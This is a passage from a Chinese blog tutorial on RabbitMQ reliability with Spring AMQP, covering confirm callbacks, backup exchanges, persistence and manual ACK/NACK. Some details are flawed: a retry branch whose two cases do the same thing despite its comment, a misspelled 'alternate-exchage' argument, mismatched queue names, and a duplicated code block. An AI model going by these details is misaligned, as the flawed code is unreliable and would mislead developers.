<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processMessage</span><span class="hljs-params">(String dataString, Message message,Channel channel)</span>&#123;  <br>            System.out.println(<span class="hljs-string">&quot;消息的 dataString:&quot;</span> + dataString);  <br>            System.out.println(<span class="hljs-string">&quot;消息的 message:&quot;</span> + message);  <br>            System.out.println(<span class="hljs-string">&quot;消息的 channel:&quot;</span> + channel);  <br>&#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>String dataString</code>：<ol><li>表示消息的正文内容（也叫消息体）</li><li>Spring AMQP 会根据你的参数类型，自动把原始消息内容转换成相应类型。比如你写的是 <code>String</code>，它就把消息体转成字符串给你。</li></ol></li><li><code>Message message</code>：<ol><li>封装了整个消息的元信息（meta 信息）</li><li>主要包括：<ol><li><font color="#00b0f0">消息体</font>：<ol><li><code>byte[] body = message.getBody();</code> 可获取原始字节数组</li></ol></li><li><font color="#00b0f0">消息属性</font>：<ol><li><code>MessageProperties messageProperties = message.getMessageProperties();</code> 可获取消息属性对象。</li><li>可进一步提取具体属性，例如：<ol><li><font color="#7030a0">内容类型</font>：<ol><li><code>String contentType = message.getMessageProperties().getContentType();</code></li></ol></li><li><font color="#7030a0">投递标签</font>：<ol><li><code>long deliveryTag = message.getMessageProperties().getDeliveryTag();</code></li></ol></li></ol></li></ol></li></ol></li><li>来自 <code>org.springframework.amqp.core</code></li></ol></li><li><code>Channel channel</code>：<ol><li>用于与 RabbitMQ 进行底层通信，主要用于执行 <strong>手动消息确认（manual ack）</strong>、<strong>拒收（nack）</strong>、<strong>消息重回队列</strong> 等操作。</li><li>在需要手动控制消息消费流程时尤为重要。</li><li>来自 <code>com.rabbitmq.client</code></li></ol></li></ol><hr><h3 id="2-业务处理"><a href="#2-业务处理" class="headerlink" title="2. 业务处理"></a>2. 业务处理</h3><h4 id="2-1-消息可靠性投递"><a href="#2-1-消息可靠性投递" class="headerlink" title="2.1. 消息可靠性投递"></a>2.1. 消息可靠性投递</h4><h5 id="2-1-1-消息可靠性投递常见故障"><a href="#2-1-1-消息可靠性投递常见故障" class="headerlink" title="2.1.1. 消息可靠性投递常见故障"></a>2.1.1. 消息可靠性投递常见故障</h5><p>在正常的下单流程中，当订单信息成功写入消息队列后，系统通常会立即向用户返回“操作完成”的响应。  </p><p><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511143235475.png"></p><p>但在实际生产环境中，由于各种原因，可能会出现不同类型的故障。针对这些故障，我们也有相应的解决方案：</p><ol><li>&#x3D;&#x3D;故障1&#x3D;&#x3D;：<ol><li><font color="#00b0f0">描述</font>：<ol><li>消息在生产端未成功发送到消息队列中，可能卡在了中间环节。</li></ol></li><li><font color="#00b0f0">后果</font>：<ol><li>消费者无法接收到消息，导致对应业务流程未执行，最终引发数据异常或业务功能缺失。</li></ol></li><li><font color="#00b0f0">解决思路</font><ol><li><font color="#7030a0">思路1</font>：<ol><li>在生产者端启用确认机制：</li><li>消息成功发送到交换机后，由交换机返回确认响应</li><li>消息成功路由到队列后，由队列返回确认响应</li><li>双重确认，确保消息投递链路全程可控</li></ol></li><li><font color="#7030a0">思路2</font>：<ol><li>为目标交换机配置一个备份交换机，当消息无法被正常路由到目标队列时，自动转发至备份交换机，再进入备份队列</li><li>备份队列的消费者可以与主业务消费者一致，但推荐用于日志记录或告警通知，由运维或开发及时排查主队列的问题。</li><li>我们可以把备份队列的消费者的业务与主队列的消费者的业务一致，但是一般建议是日志记录，是报警，让我们的运维人员赶快修复主队列才是王道</li><li>需要注意的是，消息必须首先到达目标交换机，只有在目标交换机无法将其路由到任何队列时，才会将消息转发至备份交换机。换句话说，备份交换机的触发前提，是目标交换机已被正确命中，但消息未能成功投递至队列。</li></ol></li></ol></li></ol></li><li>&#x3D;&#x3D;故障2&#x3D;&#x3D;：<ol><li><font color="#00b0f0">描述</font>：<ol><li>消息已经成功写入队列，但由于消息队列服务器宕机，未持久化的消息（仍在内存中）丢失</li></ol></li><li><font color="#00b0f0">后果</font>：<ol><li>消息无法被消费，相关业务功能未被执行，可能导致数据不一致。</li></ol></li><li><font color="#00b0f0">解决思路</font>：<ol><li>启用消息持久化（Durability），将消息设置为持久化存储，写入磁盘而非仅保存在内存中，即使服务器重启或崩溃，消息也不会丢失</li></ol></li></ol></li><li>&#x3D;&#x3D;故障3&#x3D;&#x3D;：<ol><li><font color="#00b0f0">描述</font>：<ol><li>消息已成功写入队列，但消费端发生异常，如宕机、代码抛错等</li></ol></li><li><font color="#00b0f0">后果</font>：<ol><li>业务流程执行失败，造成功能缺失或数据错误。</li></ol></li><li><font color="#00b0f0">解决思路</font>：<ol><li>在消费端使用手动确认模式。</li><li>消费端处理完业务逻辑后，向队列返回 ACK，消息随即从队列中移除</li><li>消费失败时，向队列返回 NACK，并将消息重新标记为待消费状态，使其能够再次被消费，进行重试</li><li>对于上图，“更新购物车”、“更新库存”、“更新积分”等多个下游模块，不建议多个消费者直接抢占一个队列的消息再进行 NACK 重试。更合适的做法是采用广播模式（Publish&#x2F;Subscribe），将消息分别路由到多个业务队列中，由各业务模块独立消费、独立处理，互不干扰。</li></ol></li></ol></li></ol><hr><h5 id="2-1-2-解决故障1（思路1）"><a href="#2-1-2-解决故障1（思路1）" class="headerlink" title="2.1.2. 解决故障1（思路1）"></a>2.1.2. 解决故障1（思路1）</h5><h6 id="2-1-2-1-开启双重确认"><a href="#2-1-2-1-开启双重确认" class="headerlink" title="2.1.2.1. 开启双重确认"></a>2.1.2.1. 开启双重确认</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml">server:  <br>  rabbitmq:  <br>    host: 192.168.136.7  <br>    port: 5672  <br>    username: guest  <br>    password: 123456  <br>    virtual-host: /  <br>    publisher-confirm-type: correlated    # 开启交换机确认<br>    publisher-returns: true    # 开启队列确认<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>确认模式（Publisher Confirms）和事务模式（Transaction）不能在同一个通道中混用，通常我们推荐使用确认模式</li><li>不是简单地不加 <code>@Transactional</code> 就完事了，还需要将配置类中相关的两个设置一并去除，才能彻底禁用事务模式</li></ol></blockquote><hr><h6 id="2-1-2-2-创建-RabbitMQ-确定模式配置类，实现-rabbitTemplate-的-ConfirmCallback-与-ReturnsCallback-回调接口"><a href="#2-1-2-2-创建-RabbitMQ-确定模式配置类，实现-rabbitTemplate-的-ConfirmCallback-与-ReturnsCallback-回调接口" class="headerlink" title="2.1.2.2. 创建 RabbitMQ 确定模式配置类，实现 rabbitTemplate 的 ConfirmCallback 与 ReturnsCallback 回调接口"></a>2.1.2.2. 创建 RabbitMQ 确定模式配置类，实现 rabbitTemplate 的 ConfirmCallback 与 ReturnsCallback 回调接口</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitCallBackConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RabbitTemplate</span>.ConfirmCallback, RabbitTemplate.ReturnsCallback &#123;  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;  <br>  <br>    <span class="hljs-meta">@PostConstruct</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initRabbitTemplate</span><span class="hljs-params">()</span> &#123;  <br>        rabbitTemplate.setConfirmCallback(<span class="hljs-built_in">this</span>);  <br>        rabbitTemplate.setReturnsCallback(<span class="hljs-built_in">this</span>);  <br>    &#125;  <br>    <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">confirm</span><span class="hljs-params">(CorrelationData correlationData, <span class="hljs-type">boolean</span> ack, String cause)</span> &#123;  <br>        <span class="hljs-comment">// 当消息发送到交换机 成功或失败 时，会调用这个方法  </span><br>        System.out.println(<span class="hljs-string">&quot;confirm（）回调函数打印CorrelationData：&quot;</span>+correlationData);  <br>        System.out.println(<span class="hljs-string">&quot;confirm（）回调函数打印ack：&quot;</span>+ack);  <br>        System.out.println(<span class="hljs-string">&quot;confirm（）回调函数打印cause：&quot;</span>+cause);  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnedMessage</span><span class="hljs-params">(ReturnedMessage returnedMessage)</span> &#123;  <br>        <span class="hljs-comment">// 当消息发送到队列 失败时，才会调用这个方法  </span><br>        System.out.println(<span class="hljs-string">&quot;消息主体: &quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(returnedMessage.getMessage().getBody()));  <br>        System.out.println(<span class="hljs-string">&quot;应答码: &quot;</span> + returnedMessage.getReplyCode());  <br>        System.out.println(<span class="hljs-string">&quot;描述: &quot;</span> + returnedMessage.getReplyText());  <br>        System.out.println(<span class="hljs-string">&quot;消息使用的交换器 exchange : &quot;</span> + returnedMessage.getExchange());  <br>        System.out.println(<span class="hljs-string">&quot;消息使用的路由键 routing : &quot;</span> + returnedMessage.getRoutingKey());  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>confirm(CorrelationData correlationData, boolean ack, String cause)</code>：<ol><li><code>correlationData</code>：<ol><li>这是你发送消息时<strong>可选附带</strong>的消息唯一标识，用于追踪该消息的确认情况。</li><li>举个例子：你这样发送消息——<code>rabbitTemplate.convertAndSend(exchange, routingKey, message, new CorrelationData(&quot;123456&quot;));</code>，那么这个 <code>&quot;123456&quot;</code> 会作为标识，在 <code>correlationData</code> 中被打印出来，方便你知道这条消息的 ack 状态和失败原因。</li><li>如果你没手动设置这个标识，那这里会是 <code>null</code>。</li><li>注意不要和 <code>deliveryTag</code> 混淆——<code>correlationData</code> 是你业务代码中的追踪工具，不是 RabbitMQ 协议层面的内容。</li></ol></li><li><code>ack</code>：<ol><li>一个布尔值，表示消息是否成功到达交换机。</li><li><code>true</code> 表示成功送达交换机（但不保证路由成功，也不保证被队列接收）；</li><li><code>false</code> 表示没送达交换机，可能是交换机名写错、RabbitMQ 宕机、网络断了等。</li></ol></li><li><code>cause</code>：<ol><li>如果 <code>ack = false</code>，这里会返回具体的失败原因，帮助你排查问题。</li></ol></li></ol></li><li><code>returnedMessage(ReturnedMessage returnedMessage)</code>：<ol><li>表示消息成功送达交换机但未能路由到任何队列，于是被退回；</li><li>这个对象中包含了退回消息的内容、错误码、错误原因、交换机名称、使用的路由键等信息。</li></ol></li></ol><hr><h6 id="2-1-2-3-对-rabbitTemplate-进行增强"><a href="#2-1-2-3-对-rabbitTemplate-进行增强" class="headerlink" title="2.1.2.3. 对 rabbitTemplate 进行增强"></a>2.1.2.3. 对 rabbitTemplate 进行增强</h6><p>在上述配置类中通过 <code>initRabbitTemplate()</code> 方法设置 <code>ConfirmCallback</code> 和 <code>ReturnsCallback</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitCallBackConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RabbitTemplate</span>.ConfirmCallback, RabbitTemplate.ReturnsCallback &#123;  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;  <br>  <br>    <span class="hljs-meta">@PostConstruct</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initRabbitTemplate</span><span class="hljs-params">()</span> &#123;  <br>        rabbitTemplate.setConfirmCallback(<span class="hljs-built_in">this</span>);  <br>        rabbitTemplate.setReturnsCallback(<span class="hljs-built_in">this</span>);  <br>    &#125;  <br>    <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">confirm</span><span class="hljs-params">(CorrelationData correlationData, <span class="hljs-type">boolean</span> ack, String cause)</span> &#123;  <br>        <span class="hljs-comment">// 当消息发送到交换机 成功或失败 时，会调用这个方法  </span><br>        System.out.println(<span class="hljs-string">&quot;confirm（）回调函数打印 CorrelationData：&quot;</span>+ correlationData);  <br>        System.out.println(<span class="hljs-string">&quot;confirm（）回调函数打印 ack：&quot;</span>+ack);  <br>        System.out.println(<span class="hljs-string">&quot;confirm（）回调函数打印 cause：&quot;</span>+cause);  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnedMessage</span><span class="hljs-params">(ReturnedMessage returnedMessage)</span> &#123;  <br>        <span class="hljs-comment">// 当消息发送到队列 失败时，才会调用这个方法  </span><br>        System.out.println(<span class="hljs-string">&quot;消息主体: &quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(returnedMessage.getMessage().getBody()));  <br>        System.out.println(<span class="hljs-string">&quot;应答码: &quot;</span> + returnedMessage.getReplyCode());  <br>        System.out.println(<span class="hljs-string">&quot;描述: &quot;</span> + returnedMessage.getReplyText());  <br>        System.out.println(<span class="hljs-string">&quot;消息使用的交换器 exchange : &quot;</span> + returnedMessage.getExchange());  <br>        System.out.println(<span class="hljs-string">&quot;消息使用的路由键 routing : &quot;</span> + returnedMessage.getRoutingKey());  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>confirm(CorrelationData correlationData, boolean ack, String cause)</code>：<ol><li><code>correlationData</code>：<ol><li>这是你发送消息时<strong>可选附带</strong>的消息唯一标识，用于追踪该消息的确认情况。</li><li>举个例子：你这样发送消息——<code>rabbitTemplate.convertAndSend(exchange, routingKey, message, new CorrelationData(&quot;123456&quot;));</code>，那么这个 <code>&quot;123456&quot;</code> 会作为标识，在 <code>correlationData</code> 中被打印出来，方便你知道这条消息的 ack 状态和失败原因。</li><li>如果你没手动设置这个标识，那这里会是 <code>null</code>。</li><li>注意不要和 <code>deliveryTag</code> 混淆——<code>correlationData</code> 是你业务代码中的追踪工具，不是 RabbitMQ 协议层面的内容。</li></ol></li><li><code>ack</code>：<ol><li>一个布尔值，表示消息是否成功到达交换机。</li><li><code>true</code> 表示成功送达交换机（但不保证路由成功，也不保证被队列接收）；</li><li><code>false</code> 表示没送达交换机，可能是交换机名写错、RabbitMQ 宕机、网络断了等。</li></ol></li><li><code>cause</code>：<ol><li>如果 <code>ack = false</code>，这里会返回具体的失败原因，帮助你排查问题。</li></ol></li></ol></li><li><code>returnedMessage(ReturnedMessage returnedMessage)</code>：<ol><li>表示消息成功送达交换机但未能路由到任何队列，于是被退回；</li><li>这个对象中包含了退回消息的内容、错误码、错误原因、交换机名称、使用的路由键等信息。</li></ol></li></ol><hr><h5 id="2-1-3-解决故障1（思路2）"><a href="#2-1-3-解决故障1（思路2）" class="headerlink" title="2.1.3. 解决故障1（思路2）"></a>2.1.3. 解决故障1（思路2）</h5><h6 id="2-1-3-1-备份交换机的原理"><a href="#2-1-3-1-备份交换机的原理" class="headerlink" title="2.1.3.1. 备份交换机的原理"></a>2.1.3.1. 备份交换机的原理</h6><p><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511151430144.png"></p><hr><h6 id="2-1-3-2-创建备份交换机、备份队列，将两者绑定"><a href="#2-1-3-2-创建备份交换机、备份队列，将两者绑定" class="headerlink" title="2.1.3.2. 创建备份交换机、备份队列，将两者绑定"></a>2.1.3.2. 创建备份交换机、备份队列，将两者绑定</h6><p>交换机必须设置为 <code>fanout</code> 类型，因为当消息从主交换机转发到备份交换机时，并不会携带路由键，只能通过广播的方式进行分发，名称为：<code>test.backup.exchange</code>。队列正常创建，名称为：<code>test.backup.queue</code>。没有路由键</p><hr><h6 id="2-1-3-3-创建主交换机、主队列，将两者绑定"><a href="#2-1-3-3-创建主交换机、主队列，将两者绑定" class="headerlink" title="2.1.3.3. 创建主交换机、主队列，将两者绑定"></a>2.1.3.3. 创建主交换机、主队列，将两者绑定</h6><p>交换机需要通过 <code>Arguments</code> 参数设置 <code>alternate-exchage</code>，用于指定备份交换机，名称为：<code>test.exchange</code>。队列正常创建，名称为：<code>test.queue</code>。路由键为：<code>test</code><br><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250512162811598.png"></p><hr><h6 id="2-1-3-4-编写备份队列消费者代码"><a href="#2-1-3-4-编写备份队列消费者代码" class="headerlink" title="2.1.3.4. 编写备份队列消费者代码"></a>2.1.3.4. 编写备份队列消费者代码</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BackupQueueListener</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BACKUP_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;queue.direct.test.backup&quot;</span>;  <br>  <br>    <span class="hljs-meta">@RabbitListener(queues = &#123;BACKUP_QUEUE_NAME&#125;)</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processMessage</span><span class="hljs-params">(String dataString, Message message, Channel channel)</span> &#123;  <br>        <span class="hljs-comment">// 1. 日志记录  </span><br>  <br>        <span class="hljs-comment">// 2. 发送邮件  </span><br>  <br>        <span class="hljs-comment">// 3. 把消息持久化到数据库，方便 “回溯处理”  </span><br>  <br>        <span class="hljs-comment">// 4. 手动 ack，避免消息重回到队列  </span><br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-4-解决故障2"><a href="#2-1-4-解决故障2" class="headerlink" title="2.1.4. 解决故障2"></a>2.1.4. 解决故障2</h5><p>在 RabbitMQ 中，所有消息，无论是否持久化，都会首先存入内存。对于持久化消息，生产者发送后，RabbitMQ 会立即将消息追加到相应的存储文件，并随后向生产者确认 ACK，确保即使发生宕机也不会丢失数据。而对于非持久化消息，RabbitMQ 只有在内存压力较小的情况下才会将其写入存储文件。</p><p>虽然消息分为持久化和非持久化两类，最终所有消息都会持久化到某种存储介质中，只是持久化的时机不同。如果需要强一致性，可以选择使用持久化消息；若对一致性要求不那么严格，则可以使用非持久化消息。需要注意的是，即便消息本身是持久化的，交换机和队列也必须设置为持久化，只有这样才能确保数据不会丢失。</p><p>如果需要确保一致性，可以将数据设置为持久化，因为默认情况下，发送的消息是非持久化的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/sendMessage&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sendMessage</span><span class="hljs-params">()</span> &#123;<br>    rabbitTemplate.convertAndSend(<br>        EXCHANGE_DIRECT,<br>        ROUTING_KEY,<br>        <span class="hljs-string">&quot;first sent message!&quot;</span>,<br>        message -&gt; &#123;<br>            <span class="hljs-comment">// 设置消息持久化</span><br>            message.getMessageProperties().setDeliveryMode(MessageDeliveryMode.PERSISTENT);<br>            <span class="hljs-keyword">return</span> message;<br>        &#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;123456&quot;</span>)<br>    );<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;发送成功&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-5-解决故障3"><a href="#2-1-5-解决故障3" class="headerlink" title="2.1.5. 解决故障3"></a>2.1.5. 解决故障3</h5><h6 id="2-1-5-1-消费端三种确认模式"><a href="#2-1-5-1-消费端三种确认模式" class="headerlink" title="2.1.5.1. 消费端三种确认模式"></a>2.1.5.1. 消费端三种确认模式</h6><ol><li>&#x3D;&#x3D;自动确认模式（默认、auto）&#x3D;&#x3D;：<ol><li>只要消息被消费者方法接收到，不管是否成功处理，RabbitMQ 都会认为消息已消费成功，立刻从队列删除</li><li>万一你的消费端发生异常，如宕机、代码跑错等，消息就丢了</li></ol></li><li>&#x3D;&#x3D;手动确认模式（manual）&#x3D;&#x3D;：<ol><li>你需要再自己在代码里调用 <code>channel.basicAck()</code>、<code>channel.basicNack()</code> 或 <code>channel.basicReject()</code> 来告诉 RabbitMQ：这条消息我处理好了（或处理失败）。</li><li><code>channel.basicAck()</code> 是返回 ACK 信息</li><li><code>channel.basicNack()</code> 返回 NACK 信息</li><li><code>channel.basicReject()</code> 同样是返回 NACK 信息，但是我们一般不用这个</li></ol></li><li>&#x3D;&#x3D;无确认模式（none）&#x3D;&#x3D;：<ol><li>完全不确认，RabbitMQ 将消息从队列投递给消费者之后，就认为 “消费完成了”，强烈不推荐</li></ol></li></ol><hr><h6 id="2-1-5-2-交付标签机制"><a href="#2-1-5-2-交付标签机制" class="headerlink" title="2.1.5.2. 交付标签机制"></a>2.1.5.2. 交付标签机制</h6><p><code>deliveryTag</code> 是 RabbitMQ 为每个 Channel 中发送的消息分配的唯一编号，每发送出一条消息，这个编号就会自动递增。它的作用是标记这条消息的“身份”。  </p><p>在手动确认模式下，你只需要把这个 <code>deliveryTag</code> 传回去，RabbitMQ 就能准确知道你确认的是哪一条消息 —— 即使你并不知道这条消息是从哪个队列来的，然后他就能处理是删除信息、重新排队还是标记为死信等等</p><p>调用 <code>basicAck</code> 表示确认处理成功，RabbitMQ 会将这条消息从队列中移除；调用 <code>basicNack</code> 则表示处理失败，你可以决定这条消息是否需要重新回到队列中。</p><hr><h6 id="2-1-5-3-开启手动确认模式"><a href="#2-1-5-3-开启手动确认模式" class="headerlink" title="2.1.5.3. 开启手动确认模式"></a>2.1.5.3. 开启手动确认模式</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">server:  <br>  port: 8080  <br>spring:  <br>  application:  <br>    name: RabbitMQ  <br>  rabbitmq:  <br>    host: 192.168.136.7  <br>    port: 5672  <br>    username: guest  <br>    password: 123456  <br>    virtual-host: /  <br>    listener:  <br>      simple:  <br>        acknowledge-mode: manual    # 开启手动确认模式<br></code></pre></td></tr></table></figure><hr><h6 id="2-1-5-4-手动返回-ACK-和-NACK"><a href="#2-1-5-4-手动返回-ACK-和-NACK" class="headerlink" title="2.1.5.4. 手动返回 ACK 和 NACK"></a>2.1.5.4. 手动返回 ACK 和 NACK</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMessageListener</span> &#123;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;queue.order&quot;</span>;  <br>  <br>    <span class="hljs-meta">@RabbitListener(queues = &#123;QUEUE_NAME&#125;)</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processMessage</span><span class="hljs-params">(String dataString, Message message, Channel channel)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>  <br>        <span class="hljs-comment">// 获取当前消息的 deliveryTag        </span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">deliveryTag</span> <span class="hljs-operator">=</span> message.getMessageProperties().getDeliveryTag();  <br>  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-comment">// 核心操作  </span><br>            System.out.println(<span class="hljs-string">&quot;消费端 消息内容: &quot;</span> + dataString);  <br>  <br>            <span class="hljs-comment">// 核心操作成功: 返回 ACK 信息  </span><br>            channel.basicAck(deliveryTag, <span class="hljs-literal">false</span>);  <br>  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>        <br>            <span class="hljs-comment">// 判断该消息是否为重复投递。如果不是重复的，可以选择重新投递；如果是重复的，则可以考虑不再投递，避免死循环或资源浪费</span><br>            <span class="hljs-type">Boolean</span> <span class="hljs-variable">redelivered</span> <span class="hljs-operator">=</span> message.getMessageProperties().getRedelivered();  <br>  <br>            <span class="hljs-keyword">if</span> (redelivered)&#123;  <br>                channel.basicNack(deliveryTag, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);  <br>            &#125;<span class="hljs-keyword">else</span> &#123;  <br>                channel.basicNack(deliveryTag,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>);  <br>            &#125;  <br>            <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">第一个参数</font>：<ol><li>用于指定要处理的消息的 <code>deliveryTag</code></li></ol></li><li><font color="#00b0f0">第二个参数</font>：<ol><li>指定是否进行批量处理</li><li>如果为 <code>true</code>，表示从最早的消息到当前这个 <code>deliveryTag</code> 之间的所有消息都会一起处理</li><li>如果为 <code>false</code>，则仅处理当前指定的这条消息</li></ol></li><li><font color="#00b0f0">第三个参数</font>：<ol><li>表示是否将该消息重新投递</li><li>如果为 <code>true</code>，表示将消息重新放回队列，由 broker 再次投递</li><li>如果未 <code>false</code>，表示不再投递，broker 会直接丢弃该消息。</li></ol></li></ol></blockquote><p><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511171953565.png"></p><hr><h4 id="2-2-削峰限流（消费端限流）"><a href="#2-2-削峰限流（消费端限流）" class="headerlink" title="2.2. 削峰限流（消费端限流）"></a>2.2. 削峰限流（消费端限流）</h4><h5 id="2-2-1-削峰限流概述"><a href="#2-2-1-削峰限流概述" class="headerlink" title="2.2.1. 削峰限流概述"></a>2.2.1. 削峰限流概述</h5><p><img src="/2025/05/10/%E7%AC%94%E8%AE%B0%EF%BC%9ASpring%20Data%20RabbitMQ/image-20250511173010389.png"></p><hr><h5 